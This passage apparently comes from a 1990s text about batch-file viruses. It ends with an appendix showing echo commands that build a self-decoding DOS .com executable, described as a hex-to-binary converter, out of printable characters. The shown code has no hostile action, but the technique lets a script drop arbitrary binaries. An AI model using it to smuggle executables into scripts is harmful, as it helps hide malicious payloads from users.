more. Macro languages for mainstream software have evolved quickly during the 
past few years, and in some of them writing a virus has become almost trivial.
So don't bother.


ILLUSTRATION:

A hex2bin convertor by Herbert Kleebauer (who is, as far as I know, not a
writer of batch viruses, malicious or otherwise):

echo j@X$!PZRYI4~@@P]hWDX-a!-a!P[1/hrDX-a!-a!P[1/h#DX-a!-a!P[1/>hex2bin.com
echo @hsDX-a!-a!P[@@PP_R]!/3-GWX=zzwWUX,!rlUX$O$/P]1/Q]3/E)/Q]3/>>hex2bin.com
echo @E)/Q]3/E)/Q]3/E)/R]3-GUX,!ruUX$O$/P]1/^R]!,3/1,FVRX,0r/xx>>hex2bin.com
echo kmooook43o31mkk90100kj1402lm21723n09l07447j01402>>hex2bin.com
echo 3l3072n73l3977042l30nk0l0l203l6172m93l6677m52l57>>hex2bin.com
echo o7mm7808l0n004j21502nkl700061502k440kk0100k90100>>hex2bin.com
echo kj1502lm2173k4k440kk0200k91400kj1602lm21k8004llm>>hex2bin.com
echo 2100006665686l657220617566676574726574656n0m0j>>hex2bin.com

The first 3 lines are real machine code; they decode the other 5 lines in
memory and give control to them: then the decoded routine reads a text file
from standard input, which is simple hexadecimal (style: 10ab03fb129c, with
as many cr/lf's as necessary); and it converts it to a binary file, which it
sends to standard output: use redirection.

Appendix 1-5 written May 13, 1995
Appendix 6 written May 25, 1996
